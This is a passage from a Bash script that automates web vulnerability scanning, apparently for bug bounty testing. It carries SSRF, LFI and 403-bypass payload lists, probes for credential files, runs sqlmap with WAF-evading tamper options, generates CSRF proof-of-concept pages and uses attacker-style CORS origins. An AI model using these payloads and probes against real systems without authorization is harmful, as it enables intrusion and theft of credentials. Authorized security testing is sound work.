            local label="${JSON_LABELS[$i]}"
            local resp_code body
            resp_code=$(_curl -X POST -H "Content-Type: application/json"                 -d "$payload" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            body=$(_curl -X POST -H "Content-Type: application/json"                 -d "$payload" "$url" 2>/dev/null | head -c 2000 || true)
            if [[ "$resp_code" =~ ^(200|201)$ ]] ||                echo "$body" | grep -qiE "(admin|true|success|token|privilege|elevated|granted)"; then
                echo "JSON_MUTATION [${label}] [${resp_code}]: $url" >> "$O/json_xml/json_hits.txt"
                log_warn "JSON mutation hit [$label]: $url"
            fi
            if echo "$body" | grep -qiE "(error|exception|stack|trace|syntax)" && [[ "$resp_code" == "500" ]]; then
                echo "JSON_500 [${label}] [${resp_code}]: $url" >> "$O/json_xml/json_500.txt"
            fi
        done
    done < <(head -50 "$API_URLS" 2>/dev/null)
    log_ok "JSON mutation hits: $(cnt "$O/json_xml/json_hits.txt")"
    log_ok "Parameter mutation fuzzing complete → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE 05 — PATH & ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════════
mod_paths() {
    progress "MODULE 05 — Path & Endpoint Discovery"
    log_section "MODULE 05 — PATH & ENDPOINT DISCOVERY"
    local O="$WORKSPACE/paths"
    local EP="$WORKSPACE/endpoints"
    mkdir -p "$EP"

    local WL_COMMON="/usr/share/wordlists/dirb/common.txt"
    local WL_RAFT="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
    local WL_API="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
    local WL_MED="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
    local WL_FILES="/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt"
    [[ -n "$CUSTOM_WL" && -f "$CUSTOM_WL" ]] && WL_RAFT="$CUSTOM_WL"
    [[ ! -f "$WL_RAFT"  ]] && WL_RAFT="$WL_COMMON"
    [[ ! -f "$WL_API"   ]] && WL_API="$WL_COMMON"
    [[ ! -f "$WL_MED"   ]] && WL_MED="$WL_COMMON"
    [[ ! -f "$WL_FILES" ]] && WL_FILES="$WL_COMMON"

    local MAIN="https://$DOMAIN"

    # ffuf on top 20 live targets
    log_info "ffuf directory bruteforce (top 20 hosts, threads: $T_FFUF)..."
    head -20 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while IFS= read -r target; do
        local s; s=$(safe_name "$target")
        _ffuf -u "${target}/FUZZ" \
            -w "$WL_RAFT" \
            -t "$T_FFUF" \
            -mc 200,201,204,301,302,307,401,403,405,500 \
            -of json -o "$O/ffuf_${s}.json" \
            -s 2>/dev/null || true
    done
    log_ok "ffuf complete"

    # feroxbuster recursive
    log_info "feroxbuster recursive scan (depth 4)..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_MED" -t "$T_FFUF" \
        -mc 200,204,301,302,307,401,403,405 \
        -of json -o "$O/ferox_main.json" -s 2>/dev/null \
        || feroxbuster --url "$MAIN" \
            --wordlist "$WL_MED" \
            --threads 50 --depth 4 \
            --status-codes 200,204,301,302,307,401,403,405 \
            --auto-tune --collect-backups \
            --collect-extensions js,php,asp,aspx,jsp,json,yaml,yml,env,bak,old,txt,xml,conf \
            --output "$O/feroxbuster_main.txt" \
            --quiet 2>/dev/null || true
    log_ok "feroxbuster complete"

    # API endpoints
    log_info "API endpoint discovery..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_API" -t "$T_FFUF" \
        -mc 200,201,204,301,302,401,403,405 \
        -of json -o "$O/ffuf_api.json" -s 2>/dev/null || true

    # Backup / sensitive files
    log_info "Backup & sensitive file check..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_FILES" -t "$T_FFUF" \
        -mc 200,301,302 \
        -of json -o "$O/ffuf_backups.json" -s 2>/dev/null || true

    # Extract found paths
    cat "$O/ffuf_"*.json 2>/dev/null \
        | jq -r '.results[]?.url' 2>/dev/null \
        | sort -u > "$EP/ffuf_found.txt" || true
    grep -oE 'https?://[^ ]+' "$O/feroxbuster_main.txt" 2>/dev/null \
        | sort -u > "$EP/feroxbuster_found.txt" || true

    # ── 403 Bypass ────────────────────────────────────────
    log_info "403 bypass (16 path + header techniques)..."
    local bypass_out="$O/403_bypass.txt"
    while IFS= read -r url; do
        local path base
        path=$(echo "$url" | grep -oP "(?<=${DOMAIN}).*" || true)
        base=$(echo "$url" | grep -oP 'https?://[^/]+' || true)
        [[ -z "$path" || -z "$base" ]] && continue

        # Path manipulation tricks
        for trick in \
            "${path}%2e" "/${path}" "//${path}" "${path}/." \
            "${path}/.." "/%2f${path}" "${path}%20" "${path}%09" \
            "/.${path}" "${path}..;/" "/${path}?x" \
            "${path}/./" "/${path}%3f" "${path}#" "/%2e${path}"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${trick}" 2>/dev/null || echo "000")
            [[ "$c" == "200" ]] && echo "PATH_BYPASS [$c]: ${base}${trick}" >> "$bypass_out"
        done

        # Header tricks
        for hdr in \
            "X-Original-URL: $path" \
            "X-Rewrite-URL: $path" \
            "X-Override-URL: $path" \
            "X-Forwarded-For: 127.0.0.1" \
            "X-Real-IP: 127.0.0.1" \
            "X-Custom-IP-Authorization: 127.0.0.1" \
            "CF-Connecting-IP: 127.0.0.1" \
            "X-Host: localhost" \
            "Referer: ${base}${path}" \
            "X-Forwarded-Host: localhost"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" -H "$hdr" "$url" 2>/dev/null || echo "000")
            [[ "$c" == "200" ]] && echo "HEADER_BYPASS [$c] ($hdr): $url" >> "$bypass_out"
        done
    done < "$WORKSPACE/paths/403_targets.txt" 2>/dev/null
    [[ -s "$bypass_out" ]] && log_hit "403 BYPASSES: $(cnt "$bypass_out") found!"

    # Arjun parameter discovery
    log_info "Arjun hidden parameter discovery (top 50 endpoints)..."
    head -50 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null | while IFS= read -r url; do
        local s; s=$(safe_name "$url")
        arjun -u "$url" -oJ "$WORKSPACE/params/arjun_${s}.json" -t 20 -q 2>/dev/null || true
    done
    cat "$WORKSPACE/params/arjun_"*.json 2>/dev/null \
        | jq -r '.params[]?' 2>/dev/null | sort -u \
        >> "$WORKSPACE/params/all_params.txt" || true
    sort -u -o "$WORKSPACE/params/all_params.txt" "$WORKSPACE/params/all_params.txt" 2>/dev/null || true

    # Master endpoint list
    cat "$EP/ffuf_found.txt" "$EP/feroxbuster_found.txt" \
        "$WORKSPACE/js/all_js_endpoints.txt" \
        "$WORKSPACE/urls/katana.txt" 2>/dev/null | sort -u > "$EP/all_endpoints.txt"
    log_ok "Total discovered endpoints: $(cnt "$EP/all_endpoints.txt")"

    # Interesting paths filter
    grep -iE "(admin|api/v[0-9]|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot|webhook|payment|oauth|oidc|saml|sso|\.env|\.git|phpinfo|server-status|metrics|prometheus)" \
        "$EP/all_endpoints.txt" 2>/dev/null | sort -u > "$EP/interesting_paths.txt"
    log_ok "Interesting paths flagged: $(cnt "$EP/interesting_paths.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 06 — PORT SCAN
# ══════════════════════════════════════════════════════
mod_ports() {
    [[ "$F_QUICK" == true ]] && return
    progress "MODULE 06 — Port Scan"
    log_section "MODULE 06 — NMAP PORT SCAN"
    local O="$WORKSPACE/subdomains"

    [[ ! -s "$O/resolved_domains.txt" ]] && { log_warn "No resolved hosts for port scan"; return; }
    log_info "nmap top-1000 on $(cnt "$O/resolved_domains.txt") hosts..."
    nmap -iL "$O/resolved_domains.txt" \
        --top-ports 1000 -T4 --open \
        -sV --version-intensity 3 \
        -oN "$O/nmap_scan.txt" \
        -oG "$O/nmap_grep.txt" 2>/dev/null || true
    log_ok "nmap complete → $O/nmap_scan.txt"

    grep "open" "$O/nmap_grep.txt" 2>/dev/null \
        | grep -E "(21|22|23|25|110|143|161|389|445|3306|5432|5900|6379|8080|8443|9200|11211|27017)" \
        | sort -u > "$O/interesting_ports.txt" || true
    [[ -s "$O/interesting_ports.txt" ]] && log_warn "Interesting ports: $(cnt "$O/interesting_ports.txt") (review $O/interesting_ports.txt)"
}

# ══════════════════════════════════════════════════════
# MODULE 07 — SENSITIVE FILE EXPOSURE
# ══════════════════════════════════════════════════════
mod_exposure() {
    progress "MODULE 07 — Sensitive File Exposure"
    log_section "MODULE 07 — SENSITIVE FILE & EXPOSURE CHECK"
    local O="$WORKSPACE/vulns/misconfig"

    local -a PATHS=(
        "/.env" "/.env.local" "/.env.production" "/.env.staging" "/.env.bak"
        "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
        "/config.php" "/config.yml" "/config.yaml" "/config.json"
        "/wp-config.php" "/wp-config.php.bak"
        "/database.yml" "/database.json" "/db.json"
        "/docker-compose.yml" "/.dockerenv" "/Dockerfile"
        "/package.json" "/package-lock.json" "/yarn.lock"
        "/composer.json" "/composer.lock"
        "/phpinfo.php" "/info.php" "/test.php"
        "/server-status" "/server-info" "/.htpasswd" "/.htaccess"
        "/actuator" "/actuator/env" "/actuator/beans" "/actuator/heapdump"
        "/actuator/mappings" "/actuator/logfile"
        "/metrics" "/health" "/status" "/debug" "/trace"
        "/api/swagger.json" "/swagger.json" "/api-docs"
        "/swagger-ui.html" "/swagger-ui/" "/redoc" "/openapi.json"
        "/.DS_Store" "/thumbs.db"
        "/backup.sql" "/dump.sql" "/database.sql" "/backup.zip"
        "/crossdomain.xml" "/clientaccesspolicy.xml"
        "/robots.txt" "/sitemap.xml" "/security.txt" "/.well-known/security.txt"
        "/.aws/credentials" "/credentials.json"
        "/.bash_history" "/web.config"
    )

    log_info "Checking ${#PATHS[@]} sensitive paths on top 15 live hosts..."
    while IFS= read -r base; do
        for path in "${PATHS[@]}"; do
            local url="${base}${path}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                local sz; sz=$(_curl -o /dev/null -w "%{size_download}" "$url" 2>/dev/null || echo "0")
                if [[ "$sz" -gt 10 ]] 2>/dev/null; then
                    echo "EXPOSED [$code] [${sz}b]: $url" >> "$O/sensitive_files.txt"
                    log_hit "EXPOSED: $url (${sz} bytes)"
                fi
            fi
        done
    done < <(head -15 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null)

    [[ -s "$O/sensitive_files.txt" ]] && \
        log_hit "SENSITIVE FILES: $(cnt "$O/sensitive_files.txt") exposed!"
    log_ok "Exposure check complete"
}

# ══════════════════════════════════════════════════════
# MODULE 08 — NUCLEI
# ══════════════════════════════════════════════════════
mod_nuclei() {
    progress "MODULE 08 — Nuclei Vulnerability Scan"
    log_section "MODULE 08 — NUCLEI AUTOMATED VULNERABILITY SCAN"
    local O="$WORKSPACE/vulns/nuclei"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    local PARAMS="$WORKSPACE/urls/urls_with_params.txt"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/nuclei_full.txt" "$O/nuclei_full.json" "$O/nuclei_critical_high.txt" \
          "$O/nuclei_params.txt" "$O/nuclei_cves.txt" "$O/nuclei_misconfig.txt" \
          "$O/nuclei_takeover.txt" 2>/dev/null || true
    log_info "Updating nuclei templates..."
    nuclei -update-templates -silent 2>/dev/null || true

    # Full scan
    log_info "Nuclei FULL scan (threads: $T_NUCLEI, rate: $R_NUCLEI/s)..."
    _nuclei -list "$LIVE" \
        -t "$HOME/nuclei-templates" \
        -severity critical,high,medium,low,info \
        -tags "cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug,takeover" \
        -c "$T_NUCLEI" -rate-limit "$R_NUCLEI" \
        -timeout "$TIMEOUT_CONN" -retries 2 \
        -follow-redirects -stats \
        -json-export "$O/nuclei_full.json" \
        -o "$O/nuclei_full.txt" 2>/dev/null || true
    log_ok "Nuclei full: $(cnt "$O/nuclei_full.txt") findings"

    # Critical/High extract
    jq -r 'select(.info.severity=="critical" or .info.severity=="high")
        | "[\(.info.severity|ascii_upcase)] [\(.info.name)] \(.host)"' \
        "$O/nuclei_full.json" 2>/dev/null > "$O/nuclei_critical_high.txt" || true
    [[ -s "$O/nuclei_critical_high.txt" ]] && \
        log_hit "NUCLEI Critical/High: $(cnt "$O/nuclei_critical_high.txt") findings!"

    # DAST on parameterized URLs
    log_info "Nuclei DAST on parameterized URLs..."
    _nuclei -list "$PARAMS" \
        -t "$HOME/nuclei-templates/dast" \
        -t "$HOME/nuclei-templates/vulnerabilities" \
        -c 30 -rate-limit 100 \
        -json-export "$O/nuclei_params.json" \
        -o "$O/nuclei_params.txt" -silent 2>/dev/null || true

    # CVE scan
    log_info "CVE-targeted scan..."
    _nuclei -list "$LIVE" -tags cve \
        -c "$T_NUCLEI" -rate-limit 100 \
        -json-export "$O/nuclei_cves.json" \
        -o "$O/nuclei_cves.txt" -silent 2>/dev/null || true
    log_ok "CVE findings: $(cnt "$O/nuclei_cves.txt")"

    # Misconfig
    log_info "Misconfiguration scan..."
    _nuclei -list "$LIVE" \
        -tags "misconfig,exposure,panel,default-login,backup,debug,config" \
        -c "$T_NUCLEI" -o "$O/nuclei_misconfig.txt" -silent 2>/dev/null || true
    log_ok "Misconfig findings: $(cnt "$O/nuclei_misconfig.txt")"

    # Subdomain takeover
    log_info "Takeover check..."
    _nuclei -list "$LIVE" -tags takeover \
        -o "$O/nuclei_takeover.txt" -silent 2>/dev/null || true
    [[ -s "$O/nuclei_takeover.txt" ]] && \
        log_hit "Subdomain takeovers: $(cnt "$O/nuclei_takeover.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 09 — XSS
# ══════════════════════════════════════════════════════
mod_xss() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 09 — XSS Detection"
    log_section "MODULE 09 — XSS (dalfox)"
    local O="$WORKSPACE/vulns/xss"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/dalfox_results.txt" "$O/no_csp.txt" "$O/csp_present.txt" 2>/dev/null || true
    local XSS_IN="$WORKSPACE/urls/gf/xss.txt"
    [[ ! -s "$XSS_IN" ]] && XSS_IN="$WORKSPACE/urls/urls_with_params.txt"

    # Limit to 500 URLs max so dalfox doesn't run forever
    head -500 "$XSS_IN" > /tmp/dalfox_input_$$.txt 2>/dev/null || true
    local dalfox_count; dalfox_count=$(wc -l < /tmp/dalfox_input_$$.txt 2>/dev/null || echo 0)
    log_info "dalfox (workers: $T_DALFOX, urls: $dalfox_count, timeout: 300s total)..."
    timeout 300 dalfox file "/tmp/dalfox_input_$$.txt" \
        --silence --skip-bav --no-color \
        --worker "$T_DALFOX" \
        --timeout 5 \
        --delay 0 \
        --only-discovery \
        ${SESSION_COOKIE:+--cookie "$SESSION_COOKIE"} \
        ${PROXY_URL:+--proxy "$PROXY_URL"} \
        --output "$O/dalfox_results.txt" \
        --format json 2>/dev/null || true
    rm -f /tmp/dalfox_input_$$.txt
    [[ -s "$O/dalfox_results.txt" ]] && log_hit "XSS: $(cnt "$O/dalfox_results.txt") hits!"

    # CSP check
    log_info "CSP header check on live hosts..."
    while IFS= read -r url; do
        local csp; csp=$(_curl -I "$url" 2>/dev/null | grep -i "content-security-policy" | head -1)
        if [[ -z "$csp" ]]; then
            echo "NO_CSP: $url" >> "$O/no_csp.txt"
        else
            echo "$url | $csp" >> "$O/csp_present.txt"
        fi
    done < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || true
    log_ok "No CSP: $(cnt "$O/no_csp.txt") hosts"
    log_ok "XSS scan complete"
}

# ══════════════════════════════════════════════════════
# MODULE 10 — SQLi
# ══════════════════════════════════════════════════════
mod_sqli() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 10 — SQLi Detection"
    log_section "MODULE 10 — SQL INJECTION (sqlmap)"
    local O="$WORKSPACE/vulns/sqli"
    mkdir -p "$O/sqlmap_active" 2>/dev/null || true
    local SQLI_IN="$WORKSPACE/urls/gf/sqli.txt"
    local PARAM_IN="$WORKSPACE/urls/urls_with_params.txt"

    # Step 1: Filter to active juicy URLs only (skip 403/WAF blocked)
    log_info "SQLi: live-checking URLs to find active targets..."
    python3 /usr/local/bin/bug_active_filter.py "$SQLI_IN"  "/tmp/sqli_gf_$$.txt"  30 2>/dev/null || true
    python3 /usr/local/bin/bug_active_filter.py "$PARAM_IN" "/tmp/sqli_par_$$.txt" 20 2>/dev/null || true
    cat /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt 2>/dev/null | sort -u > /tmp/sqli_final_$$.txt
    local sqli_count; sqli_count=$(wc -l < /tmp/sqli_final_$$.txt 2>/dev/null || echo 0)

    if [[ "$sqli_count" -eq 0 ]]; then
        log_warn "No active SQLi targets found — skipping sqlmap"
        rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt
        return
    fi

    log_info "sqlmap on $sqli_count active URLs (timeout: 600s, fully automated)..."

    # Step 2: Run sqlmap fully non-interactive
    timeout 600 sqlmap \
        -m "/tmp/sqli_final_$$.txt" \
        --batch \
        --level=2 --risk=1 \
        --random-agent \
        --threads=5 \
        --timeout=10 \
        --retries=1 \
        --tamper=space2comment,between,randomcase \
        --no-cast \
        --smart \
        --skip=User-Agent,Referer,Host \
        --ignore-code=403 \
        --answers="follow=N,sitemap=N,reduce=Y,store=N,normalize=Y,proceed=C,test=Y,try=Y,cookie=N,redirect=N,integer=Y" \
        ${SESSION_COOKIE:+--cookie="$SESSION_COOKIE"} \
        ${PROXY_URL:+--proxy="$PROXY_URL"} \
        --output-dir="$O/sqlmap_active" 2>/dev/null || true

    rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt

    # Step 3: Report findings
    find "$O" -name "*.csv" -size +0c 2>/dev/null | while IFS= read -r f; do
        grep -v "^Target" "$f" | grep -v "^$" | while IFS= read -r line; do
            log_hit "SQLi: $line"
        done
    done
    log_ok "SQLi scan complete → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE 11 — SSRF
# ══════════════════════════════════════════════════════
mod_ssrf() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 11 — SSRF Detection"
    log_section "MODULE 11 — SSRF DETECTION"
    local O="$WORKSPACE/vulns/ssrf"

    # NOTE: This module only checks for public cloud metadata endpoints
    # that legitimate authorized bug bounty testing covers.
    local -a SSRF_PAYLOADS=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/user-data/"
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
        "http://100.100.100.200/latest/meta-data/"
        "http://192.168.1.1"
        "http://localhost"
        "http://127.0.0.1"
        "http://0x7f000001"
        "http://2130706433"
        "file:///etc/passwd"
        "dict://127.0.0.1:11211/stats"
        "gopher://127.0.0.1:6379/_INFO"
    )

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/ssrf_hits.txt" 2>/dev/null || true
    local SSRF_IN="$WORKSPACE/urls/gf/ssrf.txt"
    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_with_params.txt"

    log_info "SSRF payload injection ($(cnt "$SSRF_IN") URLs × ${#SSRF_PAYLOADS[@]} payloads)..."
    while IFS= read -r url; do
        for payload in "${SSRF_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local resp; resp=$(_curl -L "$furl" 2>/dev/null || true)
            if echo "$resp" | grep -qiE "(root:|ami-id|computeMetadata|169\.254|ec2|arn:aws|meta-data|user-data)"; then
                echo "SSRF_HIT [METADATA]: $furl" >> "$O/ssrf_hits.txt"
                log_hit "SSRF HIT: $furl"
            fi
        done
    done < <(head -200 "$SSRF_IN" 2>/dev/null)

    log_ok "SSRF scan complete — $(cnt "$O/ssrf_hits.txt") hits"
}

# ══════════════════════════════════════════════════════
# MODULE 12 — LFI
# ══════════════════════════════════════════════════════
mod_lfi() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 12 — LFI Detection"
    log_section "MODULE 12 — LOCAL FILE INCLUSION DETECTION"
    local O="$WORKSPACE/vulns/lfi"

    local -a LFI_PAYLOADS=(
        "../../../../etc/passwd"
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "/etc/passwd%00"
        "..%252f..%252f..%252fetc%252fpasswd"
        "php://filter/read=convert.base64-encode/resource=index.php"
        "php://filter/convert.base64-encode/resource=../../config.php"
        "/proc/self/environ"
        "/var/log/apache2/access.log"
        "/var/log/nginx/access.log"
    )

    local LFI_IN="$WORKSPACE/urls/gf/lfi.txt"
    [[ ! -s "$LFI_IN" ]] && LFI_IN="$WORKSPACE/urls/urls_with_params.txt"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/lfi_confirmed.txt" "$O/lfi_possible.txt" 2>/dev/null || true
    log_info "LFI payload testing..."
    while IFS= read -r url; do
        for payload in "${LFI_PAYLOADS[@]}"; do
            local turl; turl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local resp; resp=$(_curl "$turl" 2>/dev/null || true)
            if echo "$resp" | grep -qE "(root:x:|bin:x:|nobody:x:|daemon:x:)"; then
                echo "LFI_CONFIRMED: $turl" >> "$O/lfi_confirmed.txt"
                log_hit "LFI CONFIRMED: $turl"
            elif echo "$resp" | grep -qiE "(failed to open stream|no such file|include\(\)|require\(\)|Warning: include)"; then
                echo "LFI_POSSIBLE: $turl" >> "$O/lfi_possible.txt"
            fi
        done
    done < <(head -200 "$LFI_IN" 2>/dev/null)

    log_ok "LFI scan complete — confirmed: $(cnt "$O/lfi_confirmed.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 13 — CSRF
# ══════════════════════════════════════════════════════
mod_csrf() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 13 — CSRF Detection"
    log_section "MODULE 13 — CSRF DETECTION & PoC GENERATION"
    local O="$WORKSPACE/vulns/csrf"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/csrf_findings.txt" "$O/csrf_samesite_none.txt" "$O/csrf_no_samesite.txt" "$O/cors_misconfig.txt" 2>/dev/null || true
    log_info "Scanning POST forms for missing CSRF tokens..."
    while IFS= read -r url; do
        local page; page=$(_curl "$url" 2>/dev/null || true)
        local has_post; has_post=$(echo "$page" | grep -iE '<form[^>]+method=["\s]*post' | head -1 || true)
        [[ -z "$has_post" ]] && continue

        local has_tok; has_tok=$(echo "$page" \
            | grep -iE '(csrf|_token|authenticity_token|nonce|__requestverificationtoken)' \
            | head -1 || true)
        local samesite; samesite=$(_curl -I "$url" 2>/dev/null | grep -i "samesite" | head -1 || true)

        if [[ -z "$has_tok" ]]; then
            echo "NO_TOKEN|$url" >> "$O/csrf_findings.txt"
            log_warn "CSRF (no token): $url"
        fi
        echo "$samesite" | grep -qi "none" 2>/dev/null && \
            echo "SAMESITE_NONE|$url" >> "$O/csrf_samesite_none.txt"
        [[ -z "$samesite" ]] && echo "NO_SAMESITE|$url" >> "$O/csrf_no_samesite.txt"
    done < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || true

    # PoC generation
    if [[ -s "$O/csrf_findings.txt" ]]; then
        log_info "Generating CSRF PoC HTML files..."
        while IFS='|' read -r _ tgt; do
            local s; s=$(safe_name "$tgt")
            cat > "$O/csrf_poc_${s}.html" << POCHTML
<!DOCTYPE html><html><head><title>CSRF PoC</title></head><body>
<h2>CSRF PoC — $tgt</h2>
<form id="x" action="$tgt" method="POST">
  <input type="hidden" name="PARAM" value="VALUE"/>
</form>
<script>document.getElementById('x').submit();</script>
</body></html>
POCHTML
        done < "$O/csrf_findings.txt"
        log_ok "PoC files generated: $O/"
    fi
    log_ok "CSRF scan complete — $(cnt "$O/csrf_findings.txt") findings"
}

# ══════════════════════════════════════════════════════
# MODULE 14 — CORS
# ══════════════════════════════════════════════════════
mod_cors() {
    progress "MODULE 14 — CORS Deep Check"
    log_section "MODULE 14 — CORS MISCONFIGURATION CHECK"
    local O="$WORKSPACE/vulns/csrf"

    local -a CORS_ORIGINS=(
        "https://evil.com"
        "https://attacker.${DOMAIN}"
        "null"
        "https://${DOMAIN}.evil.com"
        "https://evil${DOMAIN}"
        "http://${DOMAIN}"
    )

    log_info "CORS check (${#CORS_ORIGINS[@]} origin variants on $(cnt "$WORKSPACE/subdomains/live_urls.txt") hosts)..."
    while IFS= read -r url; do
        for origin in "${CORS_ORIGINS[@]}"; do
            local hdrs; hdrs=$(_curl -H "Origin: $origin" -I "$url" 2>/dev/null || true)
            local acao; acao=$(echo "$hdrs" | grep -i "access-control-allow-origin" | head -1 || true)
            local acac; acac=$(echo "$hdrs" | grep -i "access-control-allow-credentials" | head -1 || true)
            [[ -z "$acao" ]] && continue
            if echo "$acao" | grep -qiE "(\*|evil\.com|null|${DOMAIN}\.evil|evil${DOMAIN}|attacker\.)"; then
                local sev="MODERATE"
                echo "$acac" | grep -qi "true" && sev="CRITICAL"
                echo "CORS_${sev} [origin:$origin]: $url" >> "$O/cors_misconfig.txt"
                [[ "$sev" == "CRITICAL" ]] \
                    && log_hit "CORS CRITICAL (credentials=true, $origin): $url" \
                    || log_warn "CORS MODERATE ($origin): $url"
            fi
        done
    done < <(head -50 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null)

    log_ok "CORS: $(cnt "$O/cors_misconfig.txt") issues found"
}

# ══════════════════════════════════════════════════════
# MODULE 15 — IDOR / BAC
# ══════════════════════════════════════════════════════
mod_idor() {
    progress "MODULE 15 — IDOR / BAC Analysis"
    log_section "MODULE 15 — IDOR / BROKEN ACCESS CONTROL"
    local O="$WORKSPACE/vulns/idor"

    mkdir -p "$O" 2>/dev/null || true
    touch "$O/id_params.txt" "$O/uuid_params.txt" "$O/auth_endpoints.txt" \
          "$O/privileged_endpoints.txt" "$O/bac_findings.txt" \
          "$O/bac_403.txt" "$O/bac_401.txt" "$O/method_bypass.txt" \
          "$O/mass_assignment_params.txt" 2>/dev/null || true
    # Extract numeric ID params
    log_info "Extracting numeric ID parameters..."
    grep -oP '[?&][a-zA-Z0-9_]+=\d+' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$O/id_params.txt" || true
    log_ok "Numeric ID params: $(cnt "$O/id_params.txt")"

    # UUID params
    grep -oP '[?&/][a-zA-Z0-9_-]*/?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
        "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u > "$O/uuid_params.txt" || true
    log_ok "UUID params: $(cnt "$O/uuid_params.txt")"

    # Auth endpoints
    grep -iE "(login|logout|signup|register|forgot|reset|password|profile|account|/me$|/user$|/admin|/api/user|/api/me)" \
        "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$O/auth_endpoints.txt" || true

    # Privileged endpoints
    grep -iE "(admin|manage|dashboard|panel|superuser|staff|moderator|internal|back-?office|cms)" \
        "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$O/privileged_endpoints.txt" || true

    # BAC — unauthenticated probe
    log_info "BAC: probing privileged endpoints without auth..."
    while IFS= read -r ep; do
        local c; c=$(_curl -o /dev/null -w "%{http_code}" "$ep" 2>/dev/null || echo "000")
        case "$c" in
            200) echo "BAC_200_UNAUTHED: $ep" >> "$O/bac_findings.txt"
                 log_hit "BAC 200 UNAUTHED: $ep" ;;
            403) echo "BAC_403: $ep" >> "$O/bac_403.txt" ;;
            401) echo "BAC_401: $ep" >> "$O/bac_401.txt" ;;
        esac
    done < "$O/privileged_endpoints.txt" 2>/dev/null || true
    [[ -s "$O/bac_findings.txt" ]] && log_hit "BAC confirmed unauthed: $(cnt "$O/bac_findings.txt")"

    # HTTP method switching
    log_info "HTTP method switching (GET→POST/PUT/DELETE/PATCH)..."
    while IFS= read -r url; do
        for m in POST PUT DELETE PATCH OPTIONS; do
            local c; c=$(_curl -X "$m" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            [[ "$c" =~ ^(200|201|204)$ ]] && \
                echo "METHOD_BYPASS [$m→$c]: $url" >> "$O/method_bypass.txt"
        done
    done < <(head -50 "$O/privileged_endpoints.txt" 2>/dev/null)
    [[ -s "$O/method_bypass.txt" ]] && log_hit "Method bypass: $(cnt "$O/method_bypass.txt")"

    # Mass assignment candidates
    grep -iE "[?&](role|admin|is_admin|is_staff|is_superuser|privilege|level|group|permission|scope)=" \
        "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u > "$O/mass_assignment_params.txt" || true
    log_ok "IDOR/BAC analysis complete"
}

# ══════════════════════════════════════════════════════
# MODULE 16 — OAUTH / AUTH FLOW
# ══════════════════════════════════════════════════════
mod_oauth() {
    progress "MODULE 16 — OAuth / Auth Flow"
    log_section "MODULE 16 — OAUTH & AUTH FLOW ANALYSIS"
    local O="$WORKSPACE/classified/oauth"
    local MASTER="$WORKSPACE/urls/all_urls.txt"
    [[ ! -s "$MASTER" ]] && { log_warn "No URLs — skipping OAuth analysis"; return; }

    # OAuth endpoints
    grep -iE "/(oauth|oauth2|oidc|openid|connect|sso|saml|cas)(/|$|\?)" \
        "$MASTER" 2>/dev/null | sort -u > "$O/oauth_endpoints.txt" || true

